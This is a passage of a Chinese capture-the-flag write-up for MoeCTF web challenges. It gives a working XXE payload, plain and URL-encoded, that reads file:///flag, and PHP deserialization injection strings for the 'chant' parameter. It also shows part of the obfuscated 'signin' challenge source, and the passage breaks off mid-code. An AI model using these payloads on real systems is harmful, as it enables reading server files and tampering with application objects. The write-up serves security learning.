src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1692535926243-dfeb1e76-0596-4524-883d-53eedb2fb362.png#averageHue=%23fdfdfc&clientId=u5aedd7ef-743a-4&from=paste&height=926&id=u6e8741f3&originHeight=2315&originWidth=3840&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=251144&status=done&style=none&taskId=u9ae00058-5142-4990-a29b-b5918f4b44c&title=&width=1536" srcset="/img/loading.gif" lazyload alt="1692535923295.png"><br><code> moectf&#123;oops_file_get_contents_controllable_w-in7ZTvoP4xF2JybGocn_M4nyZtKgdW&#125;</code></p>
+<h2 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h2><p>查看源码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1695732733923-82541345-fa67-4005-9f99-da2c556c814a.png#averageHue=%23fbfafa&clientId=u7641a330-62a0-4&from=paste&height=318&id=ue4d83139&originHeight=796&originWidth=1386&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=67922&status=done&style=none&taskId=uedecde01-e814-4cda-8570-a4e05964cf9&title=&width=554.4" srcset="/img/loading.gif" lazyload alt="1695732727440.png"><br>抓包看看<img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1695732775558-25d1edb9-a712-404a-83d5-67eac1ebe6cf.png#averageHue=%23f6f6f6&clientId=u7641a330-62a0-4&from=paste&height=368&id=uac5c042a&originHeight=921&originWidth=1871&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=223676&status=done&style=none&taskId=uace95fee-09ec-4948-b8f0-5b05463f3df&title=&width=748.4" srcset="/img/loading.gif" lazyload alt="1695732771885.png"><br>应该是<code>xxe</code>漏洞<br>构造payload<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY ak SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;xml&gt;&lt;name&gt;&amp;ak;&lt;/name&gt;&lt;/xml&gt;</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">ak</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;ak;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br>%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%20%3c%21%45%4e%54%49%54%59%20%61%6b%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%5d%3e%3c%78%6d%6c%3e%3c%6e%61%6d%65%3e%26%61%6b%3b%3c%2f%6e%61%6d%65%3e%3c%2f%78%6d%6c%3e<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">aa</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;aa;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br>%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%61%61%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%5d%3e%3c%78%6d%6c%3e%3c%6e%61%6d%65%3e%26%61%61%3b%3c%2f%6e%61%6d%65%3e%3c%2f%78%6d%6c%3e<br></code></pre></td></tr></table></figure>
+<p>payload：<code>xml_content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%20%3c%21%45%4e%54%49%54%59%20%61%6b%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%5d%3e%3c%78%6d%6c%3e%3c%6e%61%6d%65%3e%26%61%6b%3b%3c%2f%6e%61%6d%65%3e%3c%2f%78%6d%6c%3e</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1695732670298-267a7a52-7269-416c-b0aa-075d047c8484.png#averageHue=%23f7f5f5&clientId=u7641a330-62a0-4&from=paste&height=928&id=u466d664f&originHeight=2319&originWidth=3839&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1042106&status=done&style=none&taskId=u276c2980-96cc-4b2a-b150-ea4b2aa53cc&title=&width=1535.6" srcset="/img/loading.gif" lazyload alt="1695732667003.png"><br><code>moectf&#123;Which_one_You&#39;ve_Chosen?7VBlRuynKJ1ib54Asn-84KsGYGAT_zGC&#125;</code></p>
+<h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1693057440630-0092efc5-d9d4-4530-9ecb-9f03caadce92.png#averageHue=%23fcfbfb&clientId=u4c444f37-c33b-4&from=paste&height=564&id=u74a672b7&originHeight=1410&originWidth=2805&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=202448&status=done&style=none&taskId=u0bc0b580-9c44-476d-89f1-479eb6f8e61&title=&width=1122" srcset="/img/loading.gif" lazyload alt="1693057387601.png"><br>Hanxin.exe.php是可以直接url访问的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38473356/1693057518477-01471ef6-8d23-442a-8ec1-3087d9fc0cf1.png#averageHue=%23fefdfd&clientId=u4c444f37-c33b-4&from=paste&height=688&id=u43837f9b&originHeight=1720&originWidth=1570&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=202323&status=done&style=none&taskId=u2977616e-1e46-4a16-94b3-051651a5b0d&title=&width=628" srcset="/img/loading.gif" lazyload alt="479d4159ec7c48c0cdfd4b1f224578a.png"><br><code>O:34:&quot;Omg_It_ls_So_Cool_Bring_Me_My_Flag&quot;:2:&#123;s:5:&quot;Chant&quot;;s:3:&quot;abs&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;\\&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;</code><br>思路一：<code>?chant=O:34:&quot;Omg_It_ls_So_Cool_Bring_Me_My_Flag&quot;:2:&#123;s:5:&quot;Chant&quot;;s:10086:&quot;abssafafAF&quot;(截断);&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;\\&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;</code><br>尝试一：<code>?chant=di_yi_qiangdi_er_qiangdi_san_qiangdi_si_qiangdi_wu_qiang&quot;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;\\;</code>不行<br>思路二：好像序列化的字符数和实际不符合</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">count_characters</span>(<span class="hljs-params">input_string</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(input_string)<br><br>    <span class="hljs-comment"># 输入字符串</span><br>user_input = <span class="hljs-string">&#x27;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;&#x27;</span><br>character_count = count_characters(user_input)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;输入的字符串字数为:&quot;</span>, character_count)<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<span class="hljs-number">12</span>-<span class="hljs-number">11</span><br>        <span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<span class="hljs-number">10</span>-<span class="hljs-number">11</span><br>        <span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<span class="hljs-number">12</span>-<span class="hljs-number">12</span><br>        <span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<span class="hljs-number">14</span>-<span class="hljs-number">11</span><br>        <span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<span class="hljs-number">8</span>-<span class="hljs-number">11</span><br>        <span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<span class="hljs-number">12</span>-<span class="hljs-number">12</span><br>        <span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<span class="hljs-number">16</span>-<span class="hljs-number">11</span><br>        <span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<span class="hljs-number">7</span>-<span class="hljs-number">11</span><br>        <span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<span class="hljs-number">32</span>-<span class="hljs-number">12</span><br>        <span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<span class="hljs-number">8</span>-<span class="hljs-number">12</span><br>        <span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<span class="hljs-number">10</span>-<span class="hljs-number">15</span><br>        <span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<span class="hljs-number">16</span>-<span class="hljs-number">15</span><br>        <span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><span class="hljs-number">21</span>-<span class="hljs-number">16</span><br>    ); <span class="hljs-number">2</span>+<span class="hljs-number">20</span>+<span class="hljs-number">15</span>=<span class="hljs-number">37</span><br></code></pre></td></tr></table></figure>
+<p>凑37<br><code>?chant=di_jiu_qiangdi_jiu_qiangdi_wu_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;\\</code><br> <code>moectf&#123;C00L_b0Y!_5vRXH14dSaeubo3ykLjfc6OqaF4vUEpW&#125;</code></p>
+<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>给了一个<code>main.py</code>文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> users, salt<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> http.server<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):<br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())<br><br><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">int</span>.to_bytes(<span class="hljs-number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="hljs-number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="hljs-number">160</span>,<span class="hljs-string">&quot;big&quot;</span>,signed=<span class="hljs-literal">True</span>).decode().translate(&#123;<span class="hljs-built_in">ord</span>(c):<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\x00&quot;</span>&#125;)) <span class="hljs-comment"># what is it?</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data:<span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            data = base64.b64encode(data).decode() <span class="hljs-comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br>        <span class="hljs-keyword">return</span> data<br><br>__page__ = base64.b64encode(<span class="hljs-string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/&quot;</span>:<br>                self.send_response(<span class="hljs-number">200</span>)<br>                self.end_headers()<br>                self.wfile.write(__page__)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span 